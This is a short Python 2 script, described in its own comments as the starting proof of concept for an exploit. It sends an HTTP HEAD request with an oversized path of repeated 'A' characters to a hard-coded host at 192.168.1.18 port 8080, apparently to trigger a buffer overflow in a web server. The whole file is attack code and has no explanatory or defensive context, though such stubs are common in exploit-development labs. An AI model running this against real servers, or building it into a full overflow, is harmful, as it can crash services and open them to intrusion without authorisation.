#!/usr/bin/python

import os
import sys
import socket

# For this particular exploit, our attack vector is via a
# HTTP HEAD request. We'll start with a basic PoC and build on it

target = "192.168.1.18"
port   = 8080
data = "A"*100

buffer = (
"HEAD /" + data + " HTTP/1.1\r\n"
"Host: 192.168.1.18:8080\r\n"
"User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0\r\n"
"Connection: keep-alive\r\n\r\n")

exploit = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
exploit.connect((target, port))

print "[*] connected to %s" % target
exploit.send(buffer)
print "[*] buffer sent to target"
exploit.close()
